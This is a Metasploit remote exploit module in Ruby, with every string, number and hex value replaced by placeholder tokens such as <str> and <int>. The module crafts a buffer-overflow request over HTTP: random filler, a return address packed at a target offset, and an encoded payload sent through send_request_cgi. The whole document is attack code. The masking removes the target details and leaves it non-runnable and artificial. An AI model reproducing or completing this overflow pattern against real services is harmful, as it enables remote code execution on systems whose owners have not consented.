require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > false , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <hex> , <str> = > <int> } ] , ] , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , Opt :: RPORT ( <int> ) ] , self . class ) end def exploit print_status ( <str> ) crash = rand_text_alphanumeric ( <int> , payload_badchars ) crash [ target [ <str> ] - <int> , <int> ] = <str> crash [ target [ <str> ] , <int> ] = [ target . ret ] . pack ( <str> ) crash [ target [ <str> ] + <int> , payload . encoded . length ] = payload . encoded res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] , <str> ) , <str> = > <str> , <str> = > false , <str> = > { <str> = > <str> , } , <str> = > { crash = > nil } } , <int> ) print_status ( <str> ) select ( nil , nil , nil , <int> ) end end 
